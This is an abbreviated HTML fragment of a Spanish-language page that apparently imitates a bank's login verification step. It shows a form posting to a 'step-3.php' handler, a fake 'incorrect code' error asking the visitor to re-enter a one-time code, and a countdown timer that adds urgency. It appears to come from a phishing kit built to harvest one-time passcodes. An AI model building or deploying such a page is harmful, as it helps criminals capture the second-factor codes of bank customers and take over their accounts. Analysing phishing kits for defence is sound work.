  ...
  <body class="no-js">
    <div id="content">
      ...
      <form id="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar"
            name="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar" method="post" action="../amano/step-3.php"
      ...
      <div class="container-nubes">
        <div class="container nubes">
          ...
          <p style="text-align: left; color: red">
            El código que ingresaste es incorrecto. Por favor, verifica el
            código enviado a tu contacto de confianza y escríbelo nuevamente.
          </p>
          <div class="loader-container">
            <div class="loader"></div>
            <div class="text-container">
              <p id="countdown">
                El código vence en:<br /><span id="timer">06:45</span> minutos
              </p>
            </div>
        ...
        <div class="text-center mt-3">
          <button id="btnOTP" name="btnOTP" class="ban-boom" disabled>
            CONTINUAR
          </button>
        </div>
      </div>
